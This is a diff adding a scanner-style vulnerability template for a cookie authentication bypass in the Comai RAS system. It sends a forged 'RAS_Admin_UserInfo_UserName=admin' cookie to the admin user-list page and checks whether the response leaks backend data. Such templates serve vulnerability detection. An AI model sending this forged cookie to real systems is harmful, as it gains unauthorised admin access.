@@ -1,0 +1,30 @@
+id: comai-ras-cookie-bypass
+brief:
+    title: Comai RAS System Cookie - Authentication Override
+    by: SleepingBag945
+    level: high
+    about: Comai RAS system has cookie authentication overreach, when RAS_Admin_UserInfo_UserName is set to admin, the background can be accessed
+    label:
+        - comai-ras
+        - ras
+        - kemai
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/Server/CmxUser.php?pgid=UserList'
+      head:
+        cookie: RAS_Admin_UserInfo_UserName=admin
+      signs:
+        - "on": word
+          has:
+            - '"?pgid=User_Show'
+            - usingeKey
+            - MachineAmount
+            - AppLoginType
+            - TimeType
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
